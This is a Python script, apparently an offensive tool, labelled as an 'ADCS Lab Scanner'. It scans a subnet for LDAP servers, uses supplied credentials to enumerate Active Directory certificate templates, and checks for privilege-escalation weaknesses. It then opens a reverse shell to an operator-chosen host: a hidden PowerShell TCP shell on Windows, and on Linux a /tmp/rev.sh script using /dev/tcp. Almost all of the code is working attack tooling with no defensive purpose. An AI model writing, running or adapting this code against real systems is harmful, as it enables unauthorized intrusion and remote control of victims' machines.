#!/usr/bin/env python3
import argparse, logging, json, time, ipaddress, socket, os, subprocess, platform
from datetime import datetime
from ldap3 import Server, Connection, NTLM, ALL

LOG_FILE = "adcs_lab_output.json"

class JsonFormatter(logging.Formatter):
    def format(self, record):
        return json.dumps({'time': datetime.utcnow().isoformat() + 'Z','level': record.levelname,'message': record.getMessage()})

logger = logging.getLogger("ADCSLab")
logger.setLevel(logging.INFO)
console = logging.StreamHandler()
console.setFormatter(logging.Formatter("\033[1;32m[%(levelname)s]\033[0m %(message)s"))
logger.addHandler(console)
file_handler = logging.FileHandler(LOG_FILE)
file_handler.setFormatter(JsonFormatter())
logger.addHandler(file_handler)

class ADCSLabScanner:
    def __init__(self, domain, user, password, ldap_cidr):
        self.domain = domain
        self.user = user
        self.password = password
        self.ldap_cidr = ldap_cidr
        self.dc_list = []
        self.templates = {}

    def find_domain_controllers(self):
        logger.info("Scanning subnet for LDAP servers...")
        for ip in ipaddress.IPv4Network(self.ldap_cidr):
            try:
                with socket.create_connection((str(ip), 389), timeout=0.5) as sock:
                    logger.info(f"Found LDAP at {ip}")
                    self.dc_list.append(str(ip))
            except:
                continue

    def enumerate_templates(self, dc_ip):
        logger.info(f"Connecting to LDAP server at {dc_ip}")
        server = Server(dc_ip, get_info=ALL)
        try:
            conn = Connection(server, user=f"{self.domain}\\{self.user}", password=self.password, authentication=NTLM, auto_bind=True)
        except Exception as e:
            logger.error(f"LDAP bind failed: {e}")
            return
        base_dn = f"CN=Configuration,DC=" + self.domain.replace(".", ",DC=")
        search_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{base_dn}"
        conn.search(search_base, '(objectClass=pKICertificateTemplate)', attributes=['cn', 'msPKI-Enrollment-Flag'])
        templates = []
        for entry in conn.entries:
            name = entry.cn.value
            flags = entry['msPKI-Enrollment-Flag'].value if 'msPKI-Enrollment-Flag' in entry else "N/A"
            templates.append({'name': name, 'flags': flags})
            logger.info(f"Template: {name} (Flags: {flags})")
        self.templates[dc_ip] = templates

    def run(self):
        self.find_domain_controllers()
        if not self.dc_list:
            logger.warning("No LDAP servers found.")
            return
        for dc_ip in self.dc_list:
            self.enumerate_templates(dc_ip)

def auto_privesc_windows(ip, port):
    logger.info("Running Windows privilege escalation checks...")
    try:
        output = subprocess.check_output(["whoami", "/priv"], stderr=subprocess.DEVNULL)
        if b"SeDebugPrivilege" in output:
            logger.info("SeDebugPrivilege is enabled")

        services = subprocess.check_output("wmic service get name,pathname,startmode", shell=True)
        for line in services.decode().splitlines():
            if "Unquoted" in line or "Program Files" in line:
                logger.info(f"Potential unquoted service path: {line}")

        reg = subprocess.check_output("reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", shell=True)
        if b"0x1" in reg:
            logger.info("AlwaysInstallElevated is enabled")

        cmd = (
            f"powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
            "{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=Invoke-Expression $d 2>&1 | Out-String ;"
            "$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\""
        )
        logger.info("Launching reverse shell...")
        os.system(cmd)
    except Exception as e:
        logger.error(f"Windows privesc failed: {e}")

def auto_privesc_linux(ip, port):
    logger.info("Running Linux privilege escalation...")
    try:
        sudo_check = subprocess.check_output("sudo -l", shell=True, stderr=subprocess.DEVNULL).decode()
        if "NOPASSWD" in sudo_check:
            logger.info("User can run sudo without password")
        if os.access("/etc/passwd", os.W_OK):
            logger.info("/etc/passwd is writable")

        shell_script = f"""#!/bin/bash
exec 5<>/dev/tcp/{ip}/{port}
cat <&5 | while read line; do $line 2>&5 >&5; done
"""
        with open("/tmp/rev.sh", "w") as f:
            f.write(shell_script)
        os.chmod("/tmp/rev.sh", 0o755)
        subprocess.Popen(["/bin/bash", "/tmp/rev.sh"])
        logger.info("Reverse shell script executed.")
    except Exception as e:
        logger.error(f"Linux privesc failed: {e}")

def auto_privesc(platform_target, ip, port):
    logger.info(f"Privilege escalation for platform: {platform_target}")
    if platform_target == "windows":
        auto_privesc_windows(ip, port)
    elif platform_target == "linux":
        auto_privesc_linux(ip, port)
    else:
        logger.warning("Unsupported platform for privilege escalation")

def parse_args():
    parser = argparse.ArgumentParser(description="ADCS Lab Scanner with Auto Privesc and Shell")
    parser.add_argument("--domain", required=True)
    parser.add_argument("--user", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--ldap-cidr", required=True)
    parser.add_argument("--platform", choices=["windows", "linux"], required=True)
    parser.add_argument("--reverse-ip", required=True)
    parser.add_argument("--reverse-port", type=int, default=4444)
    return parser.parse_args()

def main():
    args = parse_args()
    logger.info("=== Starting ADCS Lab Scanner ===")
    scanner = ADCSLabScanner(args.domain, args.user, args.password, args.ldap_cidr)
    scanner.run()
    logger.info("=== Starting Auto Privesc ===")
    auto_privesc(args.platform, args.reverse_ip, args.reverse_port)
    logger.info("=== Finished ===")

if __name__ == "__main__":
    main()
